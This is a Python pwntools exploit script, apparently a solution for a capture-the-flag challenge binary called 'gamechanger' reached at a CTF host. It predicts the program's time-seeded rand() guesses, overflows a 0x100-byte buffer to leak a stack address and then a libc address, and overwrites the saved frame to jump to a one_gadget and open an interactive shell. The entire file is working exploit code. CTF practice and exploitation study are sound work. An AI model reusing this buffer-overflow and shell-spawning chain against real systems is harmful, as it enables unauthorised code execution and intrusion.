#!/usr/bin/env python3

# type: ignore
# flake8: noqa

import ctypes

from pwn import *

elf = context.binary = ELF("./gamechanger", checksec=False)
libc = elf.libc
libc_dll = ctypes.CDLL(elf.libc.path)


def start(argv=[], *a, **kw):
    nc = "nc ctf.tcp1p.com 9254"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}

context.log_level = "CRITICAL"
while True:
    io = start()
    io.sendline(b"1")
    while True:
        time = libc_dll.time(0)
        libc_dll.srand(time)
        guess = (libc_dll.rand() + 34) % 23
        io.sendlineafter(b"1 and 100\n", str(guess).encode())
        if b"Congrats" in io.recvline():
            break

    b = 0xe0
    b = p8(b)
    payload = b"A" * 0x100
    payload += b
    io.send(payload)
    io.recvuntil(b)
    stack_leak = u64(b + io.recv(5) + b"\x00\x00")
    try:
        r = io.recvuntil(b"Do you")  # , timeout=60)
        if b"Do you" not in r:
            io.close()
            continue
    except EOFError:
        io.close()
        continue
    break

context.log_level = "INFO"
log.info(f"{stack_leak=:#x}")

io.sendline(b"1")
while True:
    time = libc_dll.time(0)
    libc_dll.srand(time)
    guess = (libc_dll.rand() + 34) % 23
    io.sendlineafter(b"1 and 100\n", str(guess).encode())
    if b"Congrats" in io.recvline():
        break

payload = b"A" * 0x100
new_rbp = stack_leak - 0x400
payload += p64(new_rbp)
payload += b"\x93"
io.send(payload)

io.recvuntil(b"person!\n")
libc_leak = u64(io.recv(6) + b"\x00\x00")
libc.address = libc_leak - 0x620d0
log.info(f"{libc.address=:#x}")

while True:
    time = libc_dll.time(0)
    libc_dll.srand(time)
    guess = (libc_dll.rand() + 34) % 23
    io.sendlineafter(b"1 and 100\n", str(guess).encode())
    if b"Congrats" in io.recvline():
        break

one_gadget = 0xebcf5
payload = b"A" * 0x100
payload += flat(
    new_rbp,
    libc.address + one_gadget,
)
io.send(payload)


io.interactive()
